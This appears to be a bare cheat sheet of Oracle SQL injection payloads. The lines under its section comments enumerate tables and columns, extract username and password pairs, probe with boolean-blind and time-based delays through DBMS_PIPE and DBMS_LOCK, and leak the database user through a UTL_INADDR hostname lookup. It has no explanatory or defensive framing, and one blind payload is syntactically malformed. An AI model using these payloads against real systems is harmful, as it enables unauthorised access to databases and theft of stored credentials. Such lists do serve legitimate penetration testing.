# ---- Dual Table (required in Oracle for SELECT without FROM) ----
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--

# ---- Enumerate Tables ----
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT table_name,NULL FROM user_tables--

# ---- Enumerate Columns ----
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# ---- String Concatenation ----
' UNION SELECT username||':'||password FROM users--
' UNION SELECT username||CHR(58)||password FROM users--

# ---- Boolean Blind ----
' AND 1=1--
' AND 1=2--
' AND SUBSTR(username,1,1)='a' FROM users WHERE ROWNUM=1--

# ---- Time-Based (DBMS_PIPE) ----
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
'; EXEC DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' OR 1=DBMS_LOCK.SLEEP(5)--

' UNION SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)),NULL FROM dual--
